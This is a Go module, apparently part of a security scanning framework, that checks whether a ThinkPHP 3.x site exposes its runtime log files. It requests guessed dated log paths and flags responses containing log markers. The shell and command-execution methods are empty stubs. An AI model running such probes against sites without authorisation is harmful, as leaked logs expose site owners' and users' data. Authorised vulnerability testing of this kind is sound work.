package thinkphp

import (
	"breach/internal/util"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type TP3LogModule struct {
	BaseUrl            string
	feature            string
	checkVulPayloadUrl []string
	checkStr           string
	checkError         string
}

func NewTP3LogModule(baseUrl string) *TP3LogModule {
	now := time.Now()
	year := now.Year()
	month := now.Month()
	day := now.Day()
	timestamp := strconv.FormatInt(now.Unix()/1000, 10)
	suffix1 := fmt.Sprintf("%d_%02d_%02d.log", year, month, day)
	suffix2 := fmt.Sprintf("%s-%d_%02d_%02d.log", timestamp, year, month, day)
	checkVulPayloadUrl := make([]string, 0)
	p := []string{
		"/Runtime/Logs/",
		"/Runtime/Logs/Home/",
		"/Runtime/Logs/Common/",
		"/App/Runtime/Logs/",
		"/App/Runtime/Logs/Home/",
		"/Application/Runtime/Logs/",
		"/Application/Runtime/Logs/Admin/",
		"/Application/Runtime/Logs/Home/",
		"/Application/Runtime/Logs/App/",
		"/Application/Runtime/Logs/Ext/",
		"/Application/Runtime/Logs/Api/",
		"/Application/Runtime/Logs/Test/",
		"/Application/Runtime/Logs/Common/",
		"/Application/Runtime/Logs/Service/",
	}
	for _, s := range p {
		checkVulPayloadUrl = append(checkVulPayloadUrl, baseUrl+s+"/"+suffix1)
		checkVulPayloadUrl = append(checkVulPayloadUrl, baseUrl+s+"/"+suffix2)
	}
	return &TP3LogModule{
		BaseUrl:            baseUrl,
		feature:            "ThinkPHP 3.x 日志泄露",
		checkVulPayloadUrl: checkVulPayloadUrl,
		checkStr:           "INFO:",
		checkError:         "[ error ]",
	}
}

func (t *TP3LogModule) CheckVul() *util.Response {
	for _, payloadUrl := range t.checkVulPayloadUrl {
		resp, err := http.Get(payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}

		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) || strings.Contains(string(bytes), t.checkError) {
			return util.Success(t.feature, payloadUrl)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP3LogModule) ExecVul(cmd string) *util.Response {
	return util.Fail("no vulnerable")
}

func (t *TP3LogModule) GetShell() *util.Response {
	return util.Fail("no vulnerable")
}
